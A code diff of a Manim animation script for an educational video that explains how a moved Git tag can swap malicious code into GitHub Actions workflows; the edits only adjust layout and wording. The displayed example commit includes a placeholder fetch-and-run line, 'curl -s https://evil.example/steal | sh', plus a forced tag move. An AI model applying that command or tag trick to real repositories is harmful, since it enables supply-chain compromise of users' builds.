@@ -34,7 +34,7 @@ def sack(color=GREY_B):
 def page(sha, msg, code, color):
     rows = VGroup(VGroup(M(sha, 26, color), T(msg, 24, GREY_B)).arrange(RIGHT, buff=0.4),
                   VGroup(*[M(c, 22, cc) for c, cc in code]).arrange(DOWN, aligned_edge=LEFT, buff=0.1)).arrange(DOWN, aligned_edge=LEFT, buff=0.22)
-    fr = RoundedRectangle(corner_radius=0.12, width=6.4, height=rows.height + 0.5, stroke_color=color, stroke_width=3).set_fill(tint(color, 0.08), 1)
+    fr = RoundedRectangle(corner_radius=0.12, width=max(6.4, rows.width + 0.6), height=rows.height + 0.5, stroke_color=color, stroke_width=3).set_fill(tint(color, 0.08), 1)
     rows.move_to(fr).align_to(fr, LEFT).shift(RIGHT * 0.3)
     return VGroup(fr, rows)
 
@@ -68,7 +68,7 @@ class D63MovingTag(VoiceScene):
         # ---------- 2. familiar: the jam shop pantry
         s1 = sack(GREY_B).move_to([0.6, -0.3, 0])
         s2 = sack(GREY_B).move_to([3.6, -0.3, 0])
-        rec = panel(VGroup(T("recipe card", 24, GREY_B), T("sugar: the sack labelled GOOD", 26)).arrange(DOWN, aligned_edge=LEFT, buff=0.15), GREY_B).move_to([-4.0, 1.6, 0])
+        rec = panel(VGroup(T("recipe card", 24, GREY_B), T("sugar: the sack labelled GOOD", 26)).arrange(DOWN, aligned_edge=LEFT, buff=0.15), GREY_B).move_to([-3.6, 1.6, 0])
         self.beat("Back to our jam shop. In the pantry there are sacks of sugar, and your recipe card says: use the sack labelled good.",
                   FadeIn(s1), FadeIn(s2), Succession(Wait(2.2), FadeIn(rec, shift=RIGHT * 0.15)), run_time=4.4)
         lab = sticky("GOOD", YELLOW_M, w=1.3, h=0.6, size=24).next_to(s1, UP, buff=0.15)
@@ -89,10 +89,10 @@ class D63MovingTag(VoiceScene):
         # ---------- 3. map: commits are sacks, a tag is the label
         wf = panel(M("uses: some-org/action@v1", 22), BLUE_M).move_to([-4.0, 2.65, 0])
         wfl = T("your workflow", 24, BLUE_M).next_to(wf, DOWN, buff=0.15)
-        pA = page("fdc7302", "Release 1.0", [('echo "scanning..."', WHITE)], GOLD_M).move_to([2.9, 1.0, 0])
+        pA = page("fdc7302", "Release 1.0", [('echo "scanning..."', WHITE)], GOLD_M).move_to([3.0, 1.0, 0])
         self.beat("Now the real thing, with a tiny experiment. Git keeps a project's history as commits, saved snapshots of every file. Each commit is one sack in the pantry.",
                   FadeIn(pA, shift=LEFT * 0.2), run_time=3.0)
-        tag = sticky("v1").move_to([-1.15, pA.get_y(), 0])
+        tag = sticky("v1").move_to([-1.45, pA.get_y(), 0])
         ta = Arrow(tag.get_right(), pA.get_left(), buff=0.1, stroke_width=3, color=YELLOW_M, max_tip_length_to_length_ratio=0.25)
         self.beat("The maintainer, the person who looks after the action, saves this commit and tags it v1. A tag is the label: a name that points at one commit, like a sticky note on a page.",
                   FadeIn(tag, shift=DOWN * 0.2), GrowArrow(ta), run_time=3.0)
@@ -101,7 +101,7 @@ class D63MovingTag(VoiceScene):
                   FadeIn(wf), FadeIn(wfl), GrowArrow(wa), run_time=2.6)
 
         # ---------- 4. predict, then show: move the tag
-        pB = page("2df87fd", "Innocent-looking fix", [('echo "scanning..."', WHITE), ("curl -s https://evil.example/steal | sh", RED_M)], RED_M).move_to([2.9, -1.6, 0])
+        pB = page("2df87fd", "Innocent-looking fix", [('echo "scanning..."', WHITE), ("curl -s https://evil.example/steal | sh", RED_M)], RED_M).move_to([3.0, -1.6, 0])
         self.beat("Now play the attacker, holding the maintainer's stolen token. Change the code, save a new commit, with a friendly message.",
                   FadeIn(pB, shift=LEFT * 0.2), run_time=2.4)
         cmd = M("$ git tag -f v1", 24, RED_M).move_to([-4.0, -2.6, 0]).align_to(np.array([-6.2, 0, 0]), LEFT)
@@ -199,7 +199,7 @@ class D63MovingTag(VoiceScene):
         self.play(FadeOut(VGroup(moral, rc)), run_time=0.5)
         qq = T("Quick check", 30, YELLOW_M).move_to([0, 2.3, 0])
         qt = VGroup(T("Your workflow pins", 30), M("docker/login-action", 28, BLUE_M), T("to a full SHA.", 30)).arrange(RIGHT, buff=0.25).move_to([0, 1.2, 0])
-        qt2 = T("Tonight someone moves every one of its tags. What runs tomorrow?", 30).move_to([0, 0.3, 0])
+        qt2 = T("Tonight someone moves all its tags. What runs tomorrow?", 30).move_to([0, 0.3, 0])
         self.beat("A quick check. Your workflow pins docker/login-action to a full SHA. Tonight, someone takes over the maintainers' account and moves every tag. What runs in tomorrow's build? Pause and think.",
                   FadeIn(qq), FadeIn(qt), FadeIn(qt2), run_time=3.0)
         self.wait(2.0)
